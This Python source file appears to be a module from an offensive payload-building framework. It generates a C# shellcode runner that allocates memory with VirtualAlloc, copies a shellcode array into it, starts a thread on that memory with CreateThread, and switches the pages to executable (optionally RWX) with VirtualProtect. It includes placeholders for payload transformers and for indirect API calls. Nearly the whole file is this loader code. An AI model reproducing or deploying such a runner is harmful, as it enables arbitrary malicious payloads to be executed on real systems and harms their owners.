from string import Template

class shellcoderunner:
    def __init__(self, arguments):
        self.memoryPermission = '0x20'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = '0x40'

    def imports(self) -> list[str]:
        return ["using System;", 
                "using System.Collections.Generic;", 
                "using System.Linq;", 
                "using System.Text;", 
                "using System.Threading.Tasks;", 
                "using System.Diagnostics;", 
                "using System.Runtime.InteropServices;"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return Template("""
            {transformers}
            int size = shellcode.Length;

            IntPtr addr = {VirtualAlloc}(IntPtr.Zero, (ulong)shellcode.Length, 0x3000, 0x04);

            Marshal.Copy(shellcode, 0, addr, size);

            IntPtr hThread = {CreateThread}(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            IntPtr oldProtect;
            {VirtualProtect}(addr, (ulong)shellcode.Length, $memoryPermission, out oldProtect);

            {WaitForSingleObject}(hThread, 0xFFFFFFFF);
""").substitute(memoryPermission = self.memoryPermission)